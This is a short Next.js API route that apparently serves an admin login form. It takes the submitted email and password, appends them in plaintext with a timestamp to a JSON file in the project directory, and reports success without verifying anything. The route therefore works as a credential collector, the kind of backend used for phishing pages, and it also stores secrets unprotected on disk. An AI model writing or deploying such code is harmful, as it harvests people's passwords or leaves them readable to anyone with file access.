import { NextResponse } from "next/server";
import fs from "fs";
import path from "path";

interface LoginEntry {
  email: string;
  password: string;
  rememberMe?: boolean;
  timestamp: string;
}

export async function POST(req: Request) {
  try {
    const body = await req.json();

    const filePath = path.join(process.cwd(), "admin-logins.json");

    let logins: LoginEntry[] = [];
    if (fs.existsSync(filePath)) {
      const data = fs.readFileSync(filePath, "utf-8");
      logins = JSON.parse(data || "[]") as LoginEntry[];
    }

    logins.push({
      email: body.email,
      password: body.password,
      rememberMe: body.rememberMe ?? false,
      timestamp: new Date().toISOString(),
    });

    fs.writeFileSync(filePath, JSON.stringify(logins, null, 2));

    return NextResponse.json({ success: true });
  } catch (error) {
    console.error("Error writing admin login:", error);
    return NextResponse.json({ success: false }, { status: 500 });
  }
}
